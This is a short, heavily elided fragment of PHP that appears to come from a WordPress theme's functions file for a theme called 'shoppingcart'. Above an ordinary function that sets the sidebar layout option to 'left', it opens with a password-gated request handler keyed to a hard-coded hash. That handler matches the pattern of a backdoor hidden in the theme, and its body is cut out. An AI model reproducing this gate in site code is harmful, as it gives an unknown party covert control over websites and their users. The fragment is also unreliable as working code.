<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'b4a7f074f3600be8fa84c1ed8fe6113a'))
	{
...
function change_adv_position( $shoppingcart_default_values ) {
	unset( $shoppingcart_default_values['shoppingcart_sidebar_layout_options'] );
	...
	$shoppingcart_default_values['shoppingcart_sidebar_layout_options'] = 'left';
